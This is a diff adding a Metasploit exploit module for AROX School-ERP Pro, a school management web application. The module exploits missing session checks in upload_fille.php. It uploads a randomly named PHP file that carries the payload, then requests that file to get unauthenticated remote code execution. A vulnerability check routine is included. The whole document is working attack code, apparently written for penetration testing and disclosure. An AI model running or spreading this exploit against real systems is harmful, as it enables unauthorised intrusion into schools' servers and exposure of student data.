@@ -1,0 +1,105 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "AROX School-ERP Pro Unauthenticated Remote Code Execution",
+      'Description' => %q(
+        This module exploits a command execution vulnerability in AROX School-ERP.
+        "import_stud.php" and "upload_fille.php" do not have session control. 
+        Session start/check functions in Line 8,9,10 are disabled with slashes.
+        Therefore an unathenticated user can execute the command on the system.
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module
+        ],
+      'References' =>
+        [
+          ['URL', 'http://www.pentest.com.tr/exploits/AROX-School-ERP-Pro-Unauthenticated-RCE-Metasploit.html'],
+          ['URL', 'https://sourceforge.net/projects/school-erp-ultimate/'] # Download
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Jun 17 2019",
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base ERP directory path", '/'])
+      ]
+    )
+  end
+
+  def exec(shell)
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_data", "#{shell}") # shell url
+    })
+  end
+
+  def upload_shell(check)
+
+    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
+    @shell = "#{fname}"
+    pdata = Rex::MIME::Message.new
+    pdata.add_part("" + payload.encoded, 'application/octet-stream', nil, "form-data; name=\"txtdocname\"; filename=\"#{fname}\"")
+    pdata.add_part('Submit', nil, nil, 'form-data; name="btnsubmit"')
+    data = pdata.to_s
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'data'  => data,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{pdata.bound}",
+      'uri' => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_fille.php")
+    })
+
+    if res && res.code == 200 && res.body =~ /Successfully/
+      print_status("Trying to upload #{fname}")
+      return true
+    else
+      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
+      return false
+    end
+  end
+
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+
+    if upload_shell(true)
+      print_good("Upload successfully.")
+      exec(@shell)
+    end
+  end
+
+  def check
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_fille.php")
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res && res.code == 200 && res.body =~ /upload_fille.php/
+      return Exploit::CheckCode::Vulnerable
+    end
+    return Exploit::CheckCode::Safe
+  end
+end
